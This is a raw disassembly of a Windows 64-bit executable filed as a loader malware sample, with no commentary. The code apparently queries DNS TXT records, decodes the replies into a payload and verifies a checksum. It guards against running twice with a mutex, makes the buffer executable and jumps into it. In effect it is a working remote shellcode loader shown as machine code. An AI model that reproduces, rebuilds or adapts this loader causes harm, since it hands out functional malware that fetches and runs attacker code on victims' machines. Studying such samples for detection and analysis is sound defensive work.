
malware_samples/loader/75d25ad8cedb8db31f2b34b87b8ec67dbd1893ddbd0ac551a96e8834e9e181ee.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140001005:	55                   	push   %rbp
   140001006:	57                   	push   %rdi
   140001007:	41 56                	push   %r14
   140001009:	48 8d 6c 24 b0       	lea    -0x50(%rsp),%rbp
   14000100e:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   140001015:	48 8b 05 e4 1f 00 00 	mov    0x1fe4(%rip),%rax        # 0x140003000
   14000101c:	48 33 c4             	xor    %rsp,%rax
   14000101f:	48 89 45 40          	mov    %rax,0x40(%rbp)
   140001023:	0f b6 0a             	movzbl (%rdx),%ecx
   140001026:	49 8b f1             	mov    %r9,%rsi
   140001029:	4c 8b b5 98 00 00 00 	mov    0x98(%rbp),%r14
   140001030:	0f b6 c1             	movzbl %cl,%eax
   140001033:	c0 e8 04             	shr    $0x4,%al
   140001036:	80 e1 0f             	and    $0xf,%cl
   140001039:	04 43                	add    $0x43,%al
   14000103b:	80 c1 43             	add    $0x43,%cl
   14000103e:	88 4c 24 41          	mov    %cl,0x41(%rsp)
   140001042:	0f b6 4a 01          	movzbl 0x1(%rdx),%ecx
   140001046:	88 44 24 40          	mov    %al,0x40(%rsp)
   14000104a:	0f b6 c1             	movzbl %cl,%eax
   14000104d:	c0 e8 04             	shr    $0x4,%al
   140001050:	80 e1 0f             	and    $0xf,%cl
   140001053:	04 43                	add    $0x43,%al
   140001055:	80 c1 43             	add    $0x43,%cl
   140001058:	88 4c 24 43          	mov    %cl,0x43(%rsp)
   14000105c:	0f b6 4a 02          	movzbl 0x2(%rdx),%ecx
   140001060:	88 44 24 42          	mov    %al,0x42(%rsp)
   140001064:	0f b6 c1             	movzbl %cl,%eax
   140001067:	c0 e8 04             	shr    $0x4,%al
   14000106a:	80 e1 0f             	and    $0xf,%cl
   14000106d:	04 43                	add    $0x43,%al
   14000106f:	80 c1 43             	add    $0x43,%cl
   140001072:	88 4c 24 45          	mov    %cl,0x45(%rsp)
   140001076:	0f b6 4a 03          	movzbl 0x3(%rdx),%ecx
   14000107a:	88 44 24 44          	mov    %al,0x44(%rsp)
   14000107e:	0f b6 c1             	movzbl %cl,%eax
   140001081:	c0 e8 04             	shr    $0x4,%al
   140001084:	80 e1 0f             	and    $0xf,%cl
   140001087:	04 43                	add    $0x43,%al
   140001089:	80 c1 43             	add    $0x43,%cl
   14000108c:	88 4c 24 47          	mov    %cl,0x47(%rsp)
   140001090:	0f b6 4a 04          	movzbl 0x4(%rdx),%ecx
   140001094:	88 44 24 46          	mov    %al,0x46(%rsp)
   140001098:	0f b6 c1             	movzbl %cl,%eax
   14000109b:	c0 e8 04             	shr    $0x4,%al
   14000109e:	80 e1 0f             	and    $0xf,%cl
   1400010a1:	04 43                	add    $0x43,%al
   1400010a3:	80 c1 43             	add    $0x43,%cl
   1400010a6:	88 4c 24 49          	mov    %cl,0x49(%rsp)
   1400010aa:	0f b6 4a 05          	movzbl 0x5(%rdx),%ecx
   1400010ae:	88 44 24 48          	mov    %al,0x48(%rsp)
   1400010b2:	0f b6 c1             	movzbl %cl,%eax
   1400010b5:	c0 e8 04             	shr    $0x4,%al
   1400010b8:	80 e1 0f             	and    $0xf,%cl
   1400010bb:	04 43                	add    $0x43,%al
   1400010bd:	80 c1 43             	add    $0x43,%cl
   1400010c0:	88 4c 24 4b          	mov    %cl,0x4b(%rsp)
   1400010c4:	0f b6 4a 06          	movzbl 0x6(%rdx),%ecx
   1400010c8:	88 44 24 4a          	mov    %al,0x4a(%rsp)
   1400010cc:	0f b6 c1             	movzbl %cl,%eax
   1400010cf:	c0 e8 04             	shr    $0x4,%al
   1400010d2:	80 e1 0f             	and    $0xf,%cl
   1400010d5:	04 43                	add    $0x43,%al
   1400010d7:	80 c1 43             	add    $0x43,%cl
   1400010da:	88 4c 24 4d          	mov    %cl,0x4d(%rsp)
   1400010de:	0f b6 4a 07          	movzbl 0x7(%rdx),%ecx
   1400010e2:	88 44 24 4c          	mov    %al,0x4c(%rsp)
   1400010e6:	0f b6 c1             	movzbl %cl,%eax
   1400010e9:	c0 e8 04             	shr    $0x4,%al
   1400010ec:	80 e1 0f             	and    $0xf,%cl
   1400010ef:	04 43                	add    $0x43,%al
   1400010f1:	80 c1 43             	add    $0x43,%cl
   1400010f4:	88 4c 24 4f          	mov    %cl,0x4f(%rsp)
   1400010f8:	0f b6 4a 08          	movzbl 0x8(%rdx),%ecx
   1400010fc:	88 44 24 4e          	mov    %al,0x4e(%rsp)
   140001100:	0f b6 c1             	movzbl %cl,%eax
   140001103:	c0 e8 04             	shr    $0x4,%al
   140001106:	80 e1 0f             	and    $0xf,%cl
   140001109:	04 43                	add    $0x43,%al
   14000110b:	80 c1 43             	add    $0x43,%cl
   14000110e:	88 4c 24 51          	mov    %cl,0x51(%rsp)
   140001112:	0f b6 4a 09          	movzbl 0x9(%rdx),%ecx
   140001116:	88 44 24 50          	mov    %al,0x50(%rsp)
   14000111a:	0f b6 c1             	movzbl %cl,%eax
   14000111d:	c0 e8 04             	shr    $0x4,%al
   140001120:	80 e1 0f             	and    $0xf,%cl
   140001123:	04 43                	add    $0x43,%al
   140001125:	88 44 24 52          	mov    %al,0x52(%rsp)
   140001129:	80 c1 43             	add    $0x43,%cl
   14000112c:	88 4c 24 53          	mov    %cl,0x53(%rsp)
   140001130:	0f b6 4a 0a          	movzbl 0xa(%rdx),%ecx
   140001134:	0f b6 c1             	movzbl %cl,%eax
   140001137:	c6 44 24 5a 00       	movb   $0x0,0x5a(%rsp)
   14000113c:	80 e1 0f             	and    $0xf,%cl
   14000113f:	c0 e8 04             	shr    $0x4,%al
   140001142:	80 c1 43             	add    $0x43,%cl
   140001145:	04 43                	add    $0x43,%al
   140001147:	88 4c 24 55          	mov    %cl,0x55(%rsp)
   14000114b:	0f b6 4a 0b          	movzbl 0xb(%rdx),%ecx
   14000114f:	88 44 24 54          	mov    %al,0x54(%rsp)
   140001153:	0f b6 c1             	movzbl %cl,%eax
   140001156:	80 e1 0f             	and    $0xf,%cl
   140001159:	c0 e8 04             	shr    $0x4,%al
   14000115c:	80 c1 43             	add    $0x43,%cl
   14000115f:	04 43                	add    $0x43,%al
   140001161:	88 4c 24 57          	mov    %cl,0x57(%rsp)
   140001165:	0f b6 4a 0c          	movzbl 0xc(%rdx),%ecx
   140001169:	48 8d 15 c0 0f 00 00 	lea    0xfc0(%rip),%rdx        # 0x140002130
   140001170:	88 44 24 56          	mov    %al,0x56(%rsp)
   140001174:	0f b6 c1             	movzbl %cl,%eax
   140001177:	80 e1 0f             	and    $0xf,%cl
   14000117a:	c0 e8 04             	shr    $0x4,%al
   14000117d:	80 c1 43             	add    $0x43,%cl
   140001180:	04 43                	add    $0x43,%al
   140001182:	88 4c 24 59          	mov    %cl,0x59(%rsp)
   140001186:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000118b:	88 44 24 58          	mov    %al,0x58(%rsp)
   14000118f:	ff 15 93 0e 00 00    	call   *0xe93(%rip)        # 0x140002028
   140001195:	33 ff                	xor    %edi,%edi
   140001197:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   14000119c:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400011a1:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400011a6:	ba 10 00 00 00       	mov    $0x10,%edx
   1400011ab:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400011b0:	45 33 c9             	xor    %r9d,%r9d
   1400011b3:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   1400011b8:	45 33 c0             	xor    %r8d,%r8d
   1400011bb:	ff 15 3f 0e 00 00    	call   *0xe3f(%rip)        # 0x140002000
   1400011c1:	85 c0                	test   %eax,%eax
   1400011c3:	0f 85 b2 00 00 00    	jne    0x14000127b
   1400011c9:	48 89 9c 24 70 01 00 	mov    %rbx,0x170(%rsp)
   1400011d0:	00 
   1400011d1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400011d6:	66 83 7b 10 10       	cmpw   $0x10,0x10(%rbx)
   1400011db:	74 0a                	je     0x1400011e7
   1400011dd:	b8 0d 00 00 00       	mov    $0xd,%eax
   1400011e2:	e9 8c 00 00 00       	jmp    0x140001273
   1400011e7:	48 8b 5b 28          	mov    0x28(%rbx),%rbx
   1400011eb:	48 8b cb             	mov    %rbx,%rcx
   1400011ee:	ff 15 2c 0e 00 00    	call   *0xe2c(%rip)        # 0x140002020
   1400011f4:	99                   	cltd
   1400011f5:	2b c2                	sub    %edx,%eax
   1400011f7:	d1 f8                	sar    $1,%eax
   1400011f9:	4c 63 d8             	movslq %eax,%r11
   1400011fc:	85 c0                	test   %eax,%eax
   1400011fe:	7e 5b                	jle    0x14000125b
   140001200:	4c 8b c7             	mov    %rdi,%r8
   140001203:	0f 1f 40 00          	nopl   0x0(%rax)
   140001207:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000120e:	00 00 
   140001210:	42 0f b6 0c 43       	movzbl (%rbx,%r8,2),%ecx
   140001215:	46 0f b6 4c 43 01    	movzbl 0x1(%rbx,%r8,2),%r9d
   14000121b:	8d 51 9d             	lea    -0x63(%rcx),%edx
   14000121e:	80 fa 0f             	cmp    $0xf,%dl
   140001221:	76 07                	jbe    0x14000122a
   140001223:	8d 41 bd             	lea    -0x43(%rcx),%eax
   140001226:	3c 0f                	cmp    $0xf,%al
   140001228:	77 34                	ja     0x14000125e
   14000122a:	80 e9 03             	sub    $0x3,%cl
   14000122d:	41 8d 41 9d          	lea    -0x63(%r9),%eax
   140001231:	c0 e1 04             	shl    $0x4,%cl
   140001234:	42 88 0c 06          	mov    %cl,(%rsi,%r8,1)
   140001238:	3c 0f                	cmp    $0xf,%al
   14000123a:	77 05                	ja     0x140001241
   14000123c:	80 e9 63             	sub    $0x63,%cl
   14000123f:	eb 0b                	jmp    0x14000124c
   140001241:	41 8d 41 bd          	lea    -0x43(%r9),%eax
   140001245:	3c 0f                	cmp    $0xf,%al
   140001247:	77 15                	ja     0x14000125e
   140001249:	80 e9 43             	sub    $0x43,%cl
   14000124c:	41 02 c9             	add    %r9b,%cl
   14000124f:	42 88 0c 06          	mov    %cl,(%rsi,%r8,1)
   140001253:	49 ff c0             	inc    %r8
   140001256:	4d 3b c3             	cmp    %r11,%r8
   140001259:	7c b5                	jl     0x140001210
   14000125b:	41 8b fb             	mov    %r11d,%edi
   14000125e:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001263:	ba 01 00 00 00       	mov    $0x1,%edx
   140001268:	41 89 3e             	mov    %edi,(%r14)
   14000126b:	ff 15 97 0d 00 00    	call   *0xd97(%rip)        # 0x140002008
   140001271:	33 c0                	xor    %eax,%eax
   140001273:	48 8b 9c 24 70 01 00 	mov    0x170(%rsp),%rbx
   14000127a:	00 
   14000127b:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   14000127f:	48 33 cc             	xor    %rsp,%rcx
   140001282:	e8 79 03 00 00       	call   0x140001600
   140001287:	48 8b b4 24 78 01 00 	mov    0x178(%rsp),%rsi
   14000128e:	00 
   14000128f:	48 81 c4 50 01 00 00 	add    $0x150,%rsp
   140001296:	41 5e                	pop    %r14
   140001298:	5f                   	pop    %rdi
   140001299:	5d                   	pop    %rbp
   14000129a:	c3                   	ret
   14000129b:	cc                   	int3
   14000129c:	cc                   	int3
   14000129d:	cc                   	int3
   14000129e:	cc                   	int3
   14000129f:	cc                   	int3
   1400012a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400012a5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400012aa:	56                   	push   %rsi
   1400012ab:	57                   	push   %rdi
   1400012ac:	41 54                	push   %r12
   1400012ae:	41 56                	push   %r14
   1400012b0:	41 57                	push   %r15
   1400012b2:	48 81 ec 60 08 00 00 	sub    $0x860,%rsp
   1400012b9:	48 8b 05 40 1d 00 00 	mov    0x1d40(%rip),%rax        # 0x140003000
   1400012c0:	48 33 c4             	xor    %rsp,%rax
   1400012c3:	48 89 84 24 50 08 00 	mov    %rax,0x850(%rsp)
   1400012ca:	00 
   1400012cb:	48 8d 8c 24 40 04 00 	lea    0x440(%rsp),%rcx
   1400012d2:	00 
   1400012d3:	4c 8b fa             	mov    %rdx,%r15
   1400012d6:	ff 15 7c 0d 00 00    	call   *0xd7c(%rip)        # 0x140002058
   1400012dc:	8b 9c 24 40 04 00 00 	mov    0x440(%rsp),%ebx
   1400012e3:	45 33 f6             	xor    %r14d,%r14d
   1400012e6:	8b f3                	mov    %ebx,%esi
   1400012e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400012ef:	00 
   1400012f0:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400012f5:	89 5c 24 40          	mov    %ebx,0x40(%rsp)
   1400012f9:	89 74 24 44          	mov    %esi,0x44(%rsp)
   1400012fd:	4c 8d 8c 24 50 04 00 	lea    0x450(%rsp),%r9
   140001304:	00 
   140001305:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000130a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000130f:	81 c3 51 c8 ec 97    	add    $0x97ecc851,%ebx
   140001315:	44 88 74 24 4c       	mov    %r14b,0x4c(%rsp)
   14000131a:	81 c6 09 9a ec a0    	add    $0xa0ec9a09,%esi
   140001320:	44 89 74 24 48       	mov    %r14d,0x48(%rsp)
   140001325:	e8 d6 fc ff ff       	call   0x140001000
   14000132a:	85 c0                	test   %eax,%eax
   14000132c:	75 c2                	jne    0x1400012f0
   14000132e:	83 7c 24 30 08       	cmpl   $0x8,0x30(%rsp)
   140001333:	75 bb                	jne    0x1400012f0
   140001335:	48 8b ac 24 54 04 00 	mov    0x454(%rsp),%rbp
   14000133c:	00 
   14000133d:	81 fd 82 2d 00 00    	cmp    $0x2d82,%ebp
   140001343:	77 ab                	ja     0x1400012f0
   140001345:	44 8b a4 24 50 04 00 	mov    0x450(%rsp),%r12d
   14000134c:	00 
   14000134d:	41 8b fe             	mov    %r14d,%edi
   140001350:	85 ed                	test   %ebp,%ebp
   140001352:	0f 84 c4 00 00 00    	je     0x14000141c
   140001358:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000135f:	00 
   140001360:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140001365:	89 5c 24 40          	mov    %ebx,0x40(%rsp)
   140001369:	89 74 24 44          	mov    %esi,0x44(%rsp)
   14000136d:	4c 8d 8c 24 50 04 00 	lea    0x450(%rsp),%r9
   140001374:	00 
   140001375:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000137a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000137f:	81 c3 51 c8 ec 97    	add    $0x97ecc851,%ebx
   140001385:	c6 44 24 4c 01       	movb   $0x1,0x4c(%rsp)
   14000138a:	81 c6 09 9a ec a0    	add    $0xa0ec9a09,%esi
   140001390:	89 7c 24 48          	mov    %edi,0x48(%rsp)
   140001394:	e8 67 fc ff ff       	call   0x140001000
   140001399:	85 c0                	test   %eax,%eax
   14000139b:	75 77                	jne    0x140001414
   14000139d:	83 7c 24 30 5e       	cmpl   $0x5e,0x30(%rsp)
   1400013a2:	75 70                	jne    0x140001414
   1400013a4:	39 bc 24 50 04 00 00 	cmp    %edi,0x450(%rsp)
   1400013ab:	75 67                	jne    0x140001414
   1400013ad:	48 8b 05 0c 22 00 00 	mov    0x220c(%rip),%rax        # 0x1400035c0
   1400013b4:	48 85 c0             	test   %rax,%rax
   1400013b7:	75 43                	jne    0x1400013fc
   1400013b9:	48 8b 05 08 22 00 00 	mov    0x2208(%rip),%rax        # 0x1400035c8
   1400013c0:	48 85 c0             	test   %rax,%rax
   1400013c3:	75 1a                	jne    0x1400013df
   1400013c5:	48 8d 0d 24 0d 00 00 	lea    0xd24(%rip),%rcx        # 0x1400020f0
   1400013cc:	ff 15 5e 0c 00 00    	call   *0xc5e(%rip)        # 0x140002030
   1400013d2:	48 89 05 ef 21 00 00 	mov    %rax,0x21ef(%rip)        # 0x1400035c8
   1400013d9:	48 85 c0             	test   %rax,%rax
   1400013dc:	75 01                	jne    0x1400013df
   1400013de:	cc                   	int3
   1400013df:	48 8d 15 16 0d 00 00 	lea    0xd16(%rip),%rdx        # 0x1400020fc
   1400013e6:	48 8b c8             	mov    %rax,%rcx
   1400013e9:	ff 15 61 0c 00 00    	call   *0xc61(%rip)        # 0x140002050
   1400013ef:	48 85 c0             	test   %rax,%rax
   1400013f2:	75 01                	jne    0x1400013f5
   1400013f4:	cc                   	int3
   1400013f5:	48 89 05 c4 21 00 00 	mov    %rax,0x21c4(%rip)        # 0x1400035c0
   1400013fc:	6b cf 5a             	imul   $0x5a,%edi,%ecx
   1400013ff:	48 8d 94 24 54 04 00 	lea    0x454(%rsp),%rdx
   140001406:	00 
   140001407:	41 b8 5a 00 00 00    	mov    $0x5a,%r8d
   14000140d:	49 03 cf             	add    %r15,%rcx
   140001410:	ff d0                	call   *%rax
   140001412:	ff c7                	inc    %edi
   140001414:	3b fd                	cmp    %ebp,%edi
   140001416:	0f 82 44 ff ff ff    	jb     0x140001360
   14000141c:	6b c5 5a             	imul   $0x5a,%ebp,%eax
   14000141f:	45 8b ce             	mov    %r14d,%r9d
   140001422:	45 8b d6             	mov    %r14d,%r10d
   140001425:	99                   	cltd
   140001426:	83 e2 03             	and    $0x3,%edx
   140001429:	03 c2                	add    %edx,%eax
   14000142b:	c1 f8 02             	sar    $0x2,%eax
   14000142e:	4c 63 d8             	movslq %eax,%r11
   140001431:	85 c0                	test   %eax,%eax
   140001433:	7e 70                	jle    0x1400014a5
   140001435:	41 83 fb 08          	cmp    $0x8,%r11d
   140001439:	72 6a                	jb     0x1400014a5
   14000143b:	41 8b cb             	mov    %r11d,%ecx
   14000143e:	0f 57 d2             	xorps  %xmm2,%xmm2
   140001441:	0f 57 c9             	xorps  %xmm1,%xmm1
   140001444:	81 e1 07 00 00 80    	and    $0x80000007,%ecx
   14000144a:	7d 07                	jge    0x140001453
   14000144c:	ff c9                	dec    %ecx
   14000144e:	83 c9 f8             	or     $0xfffffff8,%ecx
   140001451:	ff c1                	inc    %ecx
   140001453:	41 8b c3             	mov    %r11d,%eax
   140001456:	2b c1                	sub    %ecx,%eax
   140001458:	48 63 c8             	movslq %eax,%rcx
   14000145b:	49 8b c6             	mov    %r14,%rax
   14000145e:	66 90                	xchg   %ax,%ax
   140001460:	f3 41 0f 6f 04 87    	movdqu (%r15,%rax,4),%xmm0
   140001466:	41 83 c2 08          	add    $0x8,%r10d
   14000146a:	66 0f fe d0          	paddd  %xmm0,%xmm2
   14000146e:	f3 41 0f 6f 44 87 10 	movdqu 0x10(%r15,%rax,4),%xmm0
   140001475:	48 83 c0 08          	add    $0x8,%rax
   140001479:	66 0f fe c8          	paddd  %xmm0,%xmm1
   14000147d:	48 3b c1             	cmp    %rcx,%rax
   140001480:	7c de                	jl     0x140001460
   140001482:	66 0f fe ca          	paddd  %xmm2,%xmm1
   140001486:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   14000148a:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   14000148f:	66 0f fe c8          	paddd  %xmm0,%xmm1
   140001493:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   140001497:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   14000149c:	66 0f fe c8          	paddd  %xmm0,%xmm1
   1400014a0:	66 41 0f 7e c9       	movd   %xmm1,%r9d
   1400014a5:	49 63 ca             	movslq %r10d,%rcx
   1400014a8:	41 8b d6             	mov    %r14d,%edx
   1400014ab:	45 8b c6             	mov    %r14d,%r8d
   1400014ae:	4d 8b d3             	mov    %r11,%r10
   1400014b1:	49 3b cb             	cmp    %r11,%rcx
   1400014b4:	7d 3c                	jge    0x1400014f2
   1400014b6:	49 8b c3             	mov    %r11,%rax
   1400014b9:	48 2b c1             	sub    %rcx,%rax
   1400014bc:	48 83 f8 02          	cmp    $0x2,%rax
   1400014c0:	7c 25                	jl     0x1400014e7
   1400014c2:	49 ff cb             	dec    %r11
   1400014c5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1400014cc:	00 00 00 00 
   1400014d0:	41 03 14 8f          	add    (%r15,%rcx,4),%edx
   1400014d4:	45 03 44 8f 04       	add    0x4(%r15,%rcx,4),%r8d
   1400014d9:	48 83 c1 02          	add    $0x2,%rcx
   1400014dd:	49 3b cb             	cmp    %r11,%rcx
   1400014e0:	7c ee                	jl     0x1400014d0
   1400014e2:	49 3b ca             	cmp    %r10,%rcx
   1400014e5:	7d 04                	jge    0x1400014eb
   1400014e7:	45 03 0c 8f          	add    (%r15,%rcx,4),%r9d
   1400014eb:	41 8d 0c 10          	lea    (%r8,%rdx,1),%ecx
   1400014ef:	44 03 c9             	add    %ecx,%r9d
   1400014f2:	b8 0d 00 00 00       	mov    $0xd,%eax
   1400014f7:	45 3b e1             	cmp    %r9d,%r12d
   1400014fa:	44 0f 45 f0          	cmovne %eax,%r14d
   1400014fe:	41 8b c6             	mov    %r14d,%eax
   140001501:	48 8b 8c 24 50 08 00 	mov    0x850(%rsp),%rcx
   140001508:	00 
   140001509:	48 33 cc             	xor    %rsp,%rcx
   14000150c:	e8 ef 00 00 00       	call   0x140001600
   140001511:	4c 8d 9c 24 60 08 00 	lea    0x860(%rsp),%r11
   140001518:	00 
   140001519:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000151d:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   140001521:	49 8b e3             	mov    %r11,%rsp
   140001524:	41 5f                	pop    %r15
   140001526:	41 5e                	pop    %r14
   140001528:	41 5c                	pop    %r12
   14000152a:	5f                   	pop    %rdi
   14000152b:	5e                   	pop    %rsi
   14000152c:	c3                   	ret
   14000152d:	cc                   	int3
   14000152e:	cc                   	int3
   14000152f:	cc                   	int3
   140001530:	40 53                	rex push %rbx
   140001532:	48 83 ec 30          	sub    $0x30,%rsp
   140001536:	48 8b 05 c3 1a 00 00 	mov    0x1ac3(%rip),%rax        # 0x140003000
   14000153d:	48 33 c4             	xor    %rsp,%rax
   140001540:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001545:	4c 8d 05 fc 0b 00 00 	lea    0xbfc(%rip),%r8        # 0x140002148
   14000154c:	33 d2                	xor    %edx,%edx
   14000154e:	33 c9                	xor    %ecx,%ecx
   140001550:	ff 15 c2 0a 00 00    	call   *0xac2(%rip)        # 0x140002018
   140001556:	48 8b d8             	mov    %rax,%rbx
   140001559:	48 85 c0             	test   %rax,%rax
   14000155c:	74 16                	je     0x140001574
   14000155e:	ff 15 d4 0a 00 00    	call   *0xad4(%rip)        # 0x140002038
   140001564:	3d b7 00 00 00       	cmp    $0xb7,%eax
   140001569:	75 21                	jne    0x14000158c
   14000156b:	48 8b cb             	mov    %rbx,%rcx
   14000156e:	ff 15 d4 0a 00 00    	call   *0xad4(%rip)        # 0x140002048
   140001574:	b8 b7 00 00 00       	mov    $0xb7,%eax
   140001579:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   14000157e:	48 33 cc             	xor    %rsp,%rcx
   140001581:	e8 7a 00 00 00       	call   0x140001600
   140001586:	48 83 c4 30          	add    $0x30,%rsp
   14000158a:	5b                   	pop    %rbx
   14000158b:	c3                   	ret
   14000158c:	ba 00 00 10 00       	mov    $0x100000,%edx
   140001591:	33 c9                	xor    %ecx,%ecx
   140001593:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140001599:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   14000159f:	ff 15 9b 0a 00 00    	call   *0xa9b(%rip)        # 0x140002040
   1400015a5:	48 8b d8             	mov    %rax,%rbx
   1400015a8:	48 85 c0             	test   %rax,%rax
   1400015ab:	75 03                	jne    0x1400015b0
   1400015ad:	cc                   	int3
   1400015ae:	66 90                	xchg   %ax,%ax
   1400015b0:	48 8b d3             	mov    %rbx,%rdx
   1400015b3:	e8 e8 fc ff ff       	call   0x1400012a0
   1400015b8:	85 c0                	test   %eax,%eax
   1400015ba:	75 f4                	jne    0x1400015b0
   1400015bc:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   1400015c1:	ba 00 00 10 00       	mov    $0x100000,%edx
   1400015c6:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   1400015cc:	48 8b cb             	mov    %rbx,%rcx
   1400015cf:	ff 15 a3 0a 00 00    	call   *0xaa3(%rip)        # 0x140002078
   1400015d5:	ff d3                	call   *%rbx
   1400015d7:	33 c0                	xor    %eax,%eax
   1400015d9:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400015de:	48 33 cc             	xor    %rsp,%rcx
   1400015e1:	e8 1a 00 00 00       	call   0x140001600
   1400015e6:	48 83 c4 30          	add    $0x30,%rsp
   1400015ea:	5b                   	pop    %rbx
   1400015eb:	c3                   	ret
   1400015ec:	cc                   	int3
   1400015ed:	cc                   	int3
   1400015ee:	cc                   	int3
   1400015ef:	cc                   	int3
   1400015f0:	cc                   	int3
   1400015f1:	cc                   	int3
   1400015f2:	cc                   	int3
   1400015f3:	cc                   	int3
   1400015f4:	cc                   	int3
   1400015f5:	cc                   	int3
   1400015f6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400015fd:	00 00 00 
   140001600:	48 3b 0d f9 19 00 00 	cmp    0x19f9(%rip),%rcx        # 0x140003000
   140001607:	75 10                	jne    0x140001619
   140001609:	48 c1 c1 10          	rol    $0x10,%rcx
   14000160d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140001612:	75 01                	jne    0x140001615
   140001614:	c3                   	ret
   140001615:	48 c1 c9 10          	ror    $0x10,%rcx
   140001619:	e9 36 00 00 00       	jmp    0x140001654
   14000161e:	cc                   	int3
   14000161f:	cc                   	int3
   140001620:	40 53                	rex push %rbx
   140001622:	48 83 ec 20          	sub    $0x20,%rsp
   140001626:	48 8b d9             	mov    %rcx,%rbx
   140001629:	33 c9                	xor    %ecx,%ecx
   14000162b:	ff 15 6f 0a 00 00    	call   *0xa6f(%rip)        # 0x1400020a0
   140001631:	48 8b cb             	mov    %rbx,%rcx
   140001634:	ff 15 5e 0a 00 00    	call   *0xa5e(%rip)        # 0x140002098
   14000163a:	ff 15 30 0a 00 00    	call   *0xa30(%rip)        # 0x140002070
   140001640:	48 8b c8             	mov    %rax,%rcx
   140001643:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   140001648:	48 83 c4 20          	add    $0x20,%rsp
   14000164c:	5b                   	pop    %rbx
   14000164d:	48 ff 25 0c 0a 00 00 	rex.W jmp *0xa0c(%rip)        # 0x140002060
   140001654:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140001659:	48 83 ec 38          	sub    $0x38,%rsp
   14000165d:	b9 17 00 00 00       	mov    $0x17,%ecx
   140001662:	ff 15 00 0a 00 00    	call   *0xa00(%rip)        # 0x140002068
   140001668:	85 c0                	test   %eax,%eax
   14000166a:	74 07                	je     0x140001673
   14000166c:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001671:	cd 29                	int    $0x29
   140001673:	48 8d 0d 76 1a 00 00 	lea    0x1a76(%rip),%rcx        # 0x1400030f0
   14000167a:	e8 a9 00 00 00       	call   0x140001728
   14000167f:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140001684:	48 89 05 5d 1b 00 00 	mov    %rax,0x1b5d(%rip)        # 0x1400031e8
   14000168b:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140001690:	48 83 c0 08          	add    $0x8,%rax
   140001694:	48 89 05 ed 1a 00 00 	mov    %rax,0x1aed(%rip)        # 0x140003188
   14000169b:	48 8b 05 46 1b 00 00 	mov    0x1b46(%rip),%rax        # 0x1400031e8
   1400016a2:	48 89 05 b7 19 00 00 	mov    %rax,0x19b7(%rip)        # 0x140003060
   1400016a9:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   1400016ae:	48 89 05 bb 1a 00 00 	mov    %rax,0x1abb(%rip)        # 0x140003170
   1400016b5:	c7 05 91 19 00 00 09 	movl   $0xc0000409,0x1991(%rip)        # 0x140003050
   1400016bc:	04 00 c0 
   1400016bf:	c7 05 8b 19 00 00 01 	movl   $0x1,0x198b(%rip)        # 0x140003054
   1400016c6:	00 00 00 
   1400016c9:	c7 05 95 19 00 00 01 	movl   $0x1,0x1995(%rip)        # 0x140003068
   1400016d0:	00 00 00 
   1400016d3:	b8 08 00 00 00       	mov    $0x8,%eax
   1400016d8:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400016dc:	48 8d 0d 8d 19 00 00 	lea    0x198d(%rip),%rcx        # 0x140003070
   1400016e3:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   1400016ea:	00 
   1400016eb:	b8 08 00 00 00       	mov    $0x8,%eax
   1400016f0:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400016f4:	48 8b 0d 05 19 00 00 	mov    0x1905(%rip),%rcx        # 0x140003000
   1400016fb:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140001700:	b8 08 00 00 00       	mov    $0x8,%eax
   140001705:	48 6b c0 01          	imul   $0x1,%rax,%rax
   140001709:	48 8b 0d 30 19 00 00 	mov    0x1930(%rip),%rcx        # 0x140003040
   140001710:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140001715:	48 8d 0d c4 09 00 00 	lea    0x9c4(%rip),%rcx        # 0x1400020e0
